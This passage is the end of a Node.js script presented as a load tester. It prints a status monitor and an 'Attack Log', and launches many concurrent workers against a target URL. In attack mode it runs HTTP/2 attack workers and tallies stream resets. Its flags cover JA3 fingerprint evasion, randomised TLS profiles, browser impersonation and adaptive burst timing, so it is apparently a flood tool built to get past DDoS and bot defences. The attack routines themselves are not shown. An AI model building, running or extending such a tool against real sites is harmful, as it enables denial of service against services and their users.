    console.log(chalk.white.bold('Response Status Counts:'));

    if (attackMode !== 'none') {
        const sortedAttackStatuses = Object.keys(stats.statusCounts).sort();
        if (sortedAttackStatuses.length === 0) {
            console.log(chalk.gray('  (waiting for responses...)'));
        } else {
            sortedAttackStatuses.forEach(code => {
                const color = code === 'RESET' ? chalk.green : chalk.red;
                const message = HTTP_STATUS_CODES[code] || 'Unknown';
                console.log(`  ${color(code)} (${message}): ${chalk.blue(stats.statusCounts[code])}`);
            });
        }
    } else {
        if (Object.keys(stats.protocolStats).length === 0 || activeProtocols.length === 0) {
            console.log(chalk.gray('  (waiting...)'));
        } else {
            const allStatusCodes = new Set();
            activeProtocols.forEach(p => {
                Object.keys(stats.protocolStats[p].statuses).forEach(code => allStatusCodes.add(code));
            });
            const sortedStatuses = Array.from(allStatusCodes).sort((a, b) => b - a);

            if (sortedStatuses.length === 0) {
                console.log(chalk.gray('  (waiting for responses...)'));
            } else {
                const COLUMN_WIDTH = 30;
                let header = '';
                activeProtocols.forEach(p => {
                    const title = `Protocol: ${p.toUpperCase()}`;
                    const styledTitle = chalk.white.bold.underline(title);
                    const visibleLength = stripAnsi(styledTitle).length;
                    header += styledTitle + ' '.repeat(Math.max(0, COLUMN_WIDTH - visibleLength));
                });
                console.log(header);

                sortedStatuses.forEach(code => {
                    let row = '';
                    activeProtocols.forEach(protoKey => {
                        const pStats = stats.protocolStats[protoKey];
                        const count = pStats.statuses[code];
                        let cellText = '';
                        if (count) {
                            const color = String(code).startsWith('2') ? chalk.green
                                : String(code).startsWith('3') ? chalk.yellow
                                : code === 'RESET' ? chalk.green : chalk.red;
                            cellText = `  ${color(code)} (${HTTP_STATUS_CODES[code] || 'Unknown'}): ${chalk.blue(count)}`;
                        }
                        const visibleLength = stripAnsi(cellText).length;
                        row += cellText + ' '.repeat(Math.max(0, COLUMN_WIDTH - visibleLength));
                    });
                    console.log(row);
                });
            }
        }
    }

    console.log('');
    const logsToShow = attackMode !== 'none' ? lastAttackLogs : lastLogs;
    const logTitle = attackMode !== 'none' ? 'Attack Log' : 'Request Log';

    console.log(chalk.white.bold(`${logTitle} (last 5 events):`));
    if (logsToShow.length === 0) console.log(chalk.gray('  (waiting...)'));
    else {
        logsToShow.slice(-CONFIG.LOG_QUEUE_SIZE).forEach(log => console.log(`  ${log}`));
    }

    console.log(chalk.cyan('--------------------------------------------'));
}

async function gracefulShutdown() {
    console.log(chalk.yellow('\nInitiating graceful shutdown...'));
    isRunning = false;
    for (const conn of activeConnections) {
        try {
            if (conn.destroy) conn.destroy();
        } catch (e) {  }
    }
    activeConnections.clear();
}

async function main() {
    console.log(chalk.green('Starting load test...'));
    console.log(chalk.yellow(`Target: ${argv.url} | Duration: ${argv.time} min | Concurrency: ${argv.conc} | Attack: ${attackMode}`));

    selectedTlsProfile = getRandomTlsProfile();

    if (attackMode !== 'none') {
        activeProtocols = ['h2'];
        stats.protocolStats['h2'] = { responses: 0, statuses: {} };
    } else if (FLAGS.protocol) {
        console.log(chalk.cyan(`Forced protocols: ${FLAGS.protocol}`));
        const protocolMap = { '1.1': 'h1', '1': 'h1', '2': 'h2', '3': 'h3', 'h1': 'h1', 'h2': 'h2', 'h3': 'h3' };
        activeProtocols = FLAGS.protocol.split(',').map(p => protocolMap[p.trim().toLowerCase()]).filter(Boolean);
        activeProtocols = [...new Set(activeProtocols)];
        if (activeProtocols.length === 0) {
            throw new Error('Invalid protocol(s). Use "1.1", "2", or "3".');
        }
        if (FLAGS.forceHttp3 && !activeProtocols.includes('h3')) {
            activeProtocols.push('h3');
        }
    } else {
        activeProtocols = FLAGS.forceHttp3 ? ['h3'] : ['h2'];
        console.log(chalk.cyan(`Protocol: ${activeProtocols.map(p => p.toUpperCase()).join(', ')}`));
    }

    if (attackMode === 'none' && (activeProtocols.includes('h3') || FLAGS.forceHttp3)) {
        await loadImpers();
        console.log(chalk.cyan(impersAvailable
            ? 'H3 engine: impers (curl-impersonate) | H1/H2 engine: undici'
            : 'H3 engine: unavailable (will FALLBACK→H2) | H1/H2 engine: undici'));
    } else if (attackMode === 'none') {
        console.log(chalk.cyan('H1/H2 engine: undici (native)'));
    }

    if (attackMode === 'none') {
        console.log(chalk.gray(
            `Flags: ja3=${FLAGS.ja3Evasion} adaptive-delay=${FLAGS.adaptiveDelay} ` +
            `adv-burst=${FLAGS.advBurst} think-mult=${ADV_BURST_CONFIG.thinkMultiplier} ` +
            `force-h3=${FLAGS.forceHttp3} max-retries=${FLAGS.maxRetries}`
        ));
    }

    activeProtocols.forEach(p => {
        stats.protocolStats[p] = { responses: 0, statuses: {} };
    });

    if (attackMode === 'none') {

        const workerCounts = {};
        const n = activeProtocols.length;
        const base = Math.floor(concurrency / n);
        let rem = concurrency % n;
        activeProtocols.forEach((p, idx) => {
            workerCounts[p] = base + (idx < rem ? 1 : 0);
        });

        console.log(chalk.cyan('Workers per protocol: ' + activeProtocols.map(p => `${p.toUpperCase()}=${workerCounts[p]}`).join(', ')));

        let workerId = 0;
        for (const protocolKey of activeProtocols) {
            for (let i = 0; i < workerCounts[protocolKey]; i++) {
                runStandardWorker(workerId++, protocolKey);
            }
        }
    } else {
        for (let i = 0; i < concurrency; i++) {
            startHttp2AttackWorker();
        }
    }

    const monitorInterval = setInterval(updateMonitor, CONFIG.MONITOR_INTERVAL_MS);

    const testTimeout = setTimeout(async () => {
        isRunning = false;
        clearInterval(monitorInterval);
        await gracefulShutdown();
        updateMonitor();
        console.log(chalk.green.bold('\nTest finished!'));
        process.exit(0);
    }, durationMs);

    process.on('SIGINT', async () => {
        isRunning = false;
        clearInterval(monitorInterval);
        clearTimeout(testTimeout);
        await gracefulShutdown();
        updateMonitor();
        console.log(chalk.red.bold('\nTest interrupted by user.'));
        process.exit(1);
    });

    process.on('SIGTERM', async () => {
        isRunning = false;
        clearInterval(monitorInterval);
        clearTimeout(testTimeout);
        await gracefulShutdown();
        updateMonitor();
        console.log(chalk.red.bold('\nTest terminated.'));
        process.exit(0);
    });
}

main().catch(err => {
    console.error(chalk.red('A critical error occurred:'), err.message);
    process.exit(1);
});
